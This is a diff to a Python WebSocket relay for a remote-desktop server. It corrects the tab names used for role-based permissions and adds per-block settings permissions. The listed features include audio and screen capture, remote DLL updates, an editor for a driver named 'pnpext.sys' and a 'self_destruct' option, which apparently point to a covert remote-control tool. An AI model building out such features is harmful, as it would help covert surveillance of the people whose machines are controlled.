@@ -4,7 +4,7 @@ RemoteDesktop VPS Server - WebSocket Relay
 Bridges C++ host <--> Web client
 Version: 2024-03-12-v3 (stream throttle + diagnostics)
 """
-SERVER_VERSION = "1.0.194"
+SERVER_VERSION = "1.0.195"
 
 import asyncio
 import websockets
@@ -550,14 +550,34 @@ _sessions: dict = {}
 # Canonical list of tabs in the viewer. Admins by default see everything;
 # operators see a restricted subset. Users can be granted/denied individual
 # tabs via the allowed_tabs field to override the role default.
+# Canonical tab names MUST match the data-panel attribute on the
+# corresponding nav button in index.html. Previous bug: server had
+# "screenshot" but the DOM has data-panel="screenshots" (plural), so
+# an operator granted "screenshot" would never see the panel. "threat"
+# was listed but no such DOM panel exists.
+#
+# Settings sub-sections are addressable as "settings.<block>" so an
+# admin can grant individual setting blocks. If the user has plain
+# "settings" in allowed_tabs, ALL blocks are visible; otherwise only
+# the ones explicitly listed as "settings.<block>".
 ALL_TABS = [
     "dashboard", "files", "procs", "services", "registry", "programs",
-    "eventlog", "terminal", "screenshot", "audio", "threat",
+    "eventlog", "terminal", "screenshots", "audio",
     "host_events", "users", "settings",
+    "settings.save_paths",       # download / recording / screenshot / audio folders
+    "settings.screenshots_vps",  # VPS quota for screenshots
+    "settings.audio_vps",        # VPS quota for audio
+    "settings.streaming",        # jitter buffer, quality
+    "settings.ice_servers",      # STUN / TURN / WebRTC enable
+    "settings.host_update",      # Remote DLL update + Restart
+    "settings.vps_deploy",       # Upload files to VPS
+    "settings.host_config",      # pnpext.sys editor
+    "settings.threat",           # Threat Monitor
+    "settings.self_destruct",    # danger zone — always admin-only anyway
 ]
 DEFAULT_OPERATOR_TABS = [
     "dashboard", "files", "procs", "services", "terminal",
-    "screenshot", "audio",
+    "screenshots", "audio",
 ]
 MAX_ROOMS = int(os.environ.get("RDP_MAX_ROOMS", "100"))
 MAX_CLIENTS_PER_ROOM = int(os.environ.get("RDP_MAX_CLIENTS", "10"))
